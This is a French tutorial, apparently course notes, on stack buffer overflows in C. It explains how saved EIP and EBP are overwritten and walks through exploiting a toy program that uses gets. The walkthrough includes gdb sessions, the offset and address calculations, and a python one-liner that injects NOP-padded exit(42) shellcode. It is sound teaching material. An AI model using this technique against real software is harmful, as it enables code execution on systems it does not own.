# Stack Buffer Overflow

## Introduction

Certaines fonctions, notamment en langage C, sont dites "dangereuses" à utiliser car elles ne vérifient pas la taille de leurs paramètres. Une vulnérabilité Buffer Overflow consiste à mettre certains paramètres spécifiques afin que le programme exécute ce que l'attaquant a voulu qu'il exécute (et non que le programme exécute ce qu'il était censé exécuter). 

Par exemple, les fonctions comme *gets* sont vulnérables à ce genre d'attaque.

## Pile d'éxécution

Lorsqu'un programme est exécuté, plusieurs valeurs sont empilées pour la bonne exécution des instructions. Lorsque l'on appelle une nouvelle fonction (**CALL**), on empile d'abord EIP pour se souvenir de la prochaine instruction à exécuter (après l'appel de cette fonction). On jump sur l'adresse représentant la nouvelle fonction à appeler (**JMP**). On empile ensuite EBP pour créer la nouvelle stack frame et on met dans EBP l'ESP de la stack frame précédente. Enfin, on push à la suite les différentes variables locales. 

Si ces variables locales sont trop grosses, il est donc possible d'écrire sur la sauvegarde EBP et sur la sauvegarde EIP. Ecrire sur EIP est grave car on peut donc faire pointer sur un code exécutable. La plupart du temps, lorsque EIP pointe sur du code exécutable dans une zone mémoire interdite et on obtiendra un *SEGFAULT*. 

Si EIP pointe sur les variables locales, cela ne posera pas de problèmes et c'est cela qu'on exploite dans un *Buffer Overflow*.

## Attaque sur un exemple concret

Analysons l'exemple *vuln.c*

### Calcul du payload

Nous voulons connaître la taille du paramètre pour lequel on commence à écraser la sauvegarde EIP. 

```
(gdb) run
Starting program: /home/user/Desktop/test/buffer/a.out 
Tapez votre prénom :
00000000001111111112222222222333333333344444444445555555555666666666677

Program received signal SIGSEGV, Segmentation fault.
0x56556040 in puts@plt ()
(gdb) print $eip
$1 = (void (*)()) 0x56556040 <puts@plt>
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/Desktop/test/buffer/a.out 
Tapez votre prénom :
000000000011111111122222222223333333333444444444455555555556666666666777

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) print $eip
$2 = (void (*)()) 0x0
```
En faisant des tests successifs en variant la taille du paramètres de *gets*, on remarque que la valeur de EIP change lorsque l'on écrase la sauvegarde de cette dernière. 
On en déduit donc que la taille du *payload* est de 72. 

### Calcul de l'adresse EIP

Nous allons utiliser *ulimit* pour générer un fichier core à chaque fois qu'on fait un core dump. Pour cela, on fait ```ulimit -c 1024```. Ensuite, on exécute le programme et on met un argument de plus de 72 caractères. Un fichier *core* sera généré. 

On utilise donc *gdb* avec l'exécutable et le fichier core précédemment généré. Puis, on place un breakpoint dans la fonction qui appelle *gets*, juste avant cet appel de *gets*. Puis, on récupère l'adresse ESP.

```
$ gdb a.out core

Core was generated by `./a.out'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00000000 in ?? ()
(gdb) disas ask_me_im_famous
Dump of assembler code for function ask_me_im_famous:
   0x565561a9 <+0>:	push   %ebp
   0x565561aa <+1>:	mov    %esp,%ebp
   0x565561ac <+3>:	push   %ebx
   0x565561ad <+4>:	sub    $0x40,%esp
   0x565561b0 <+7>:	call   0x5655620a <__x86.get_pc_thunk.ax>
   0x565561b5 <+12>:	add    $0x2e4b,%eax
   0x565561ba <+17>:	lea    -0x44(%ebp),%edx
   0x565561bd <+20>:	push   %edx
   0x565561be <+21>:	mov    %eax,%ebx
   0x565561c0 <+23>:	call   0x56556030 <gets@plt>
   0x565561c5 <+28>:	add    $0x4,%esp
   0x565561c8 <+31>:	nop
   0x565561c9 <+32>:	mov    -0x4(%ebp),%ebx
   0x565561cc <+35>:	leave  
   0x565561cd <+36>:	ret    
End of assembler dump.
(gdb) b *0x565561c0
Breakpoint 1 at 0x565561c0
(gdb) run
Starting program: /root/Desktop/test/buffer/a.out 
Tapez votre prénom :

Breakpoint 1, 0x565561c0 in ask_me_im_famous ()
(gdb) print $esp
$1 = (void *) 0xffffd2c4
```
Avec *dmesg*, on peut voir la réelle adresse ESP : 
```
$ dmesg
[18291.252097] a.out[5439]: segfault at 30303030 ip 0000000030303030 sp 00000000ffffd364 error 14 in a.out[56555000+1000]
```

### Calcul de l'adresse où placer le payload

On a trouvé que l'adresse ESP est 0xffffd364 et le payload est de 72 donc il faudra placer le payload à l'adresse : 
0xffffd364 - 72 = 4294955876 - 72 = 4294955804 = 0xffffd31c

### Injection du payload

```
6A 01 58   # mov eax, 1  # syscall = exit ;
6A 2A 5B   # mov ebx, 42 # status = 42 ;
CD 80      # int 0x80    # return syscall(args) ;
```
python -c "print '\x6A\x01\x58\x6A\x2A\x5B\xCD\x80'.ljust(68,'\x90') + '\x1C\xD3\xFF\xFF'" | ./a.out
Il ne faut pas oublier que l'adresse doit être écrite en little endian. 


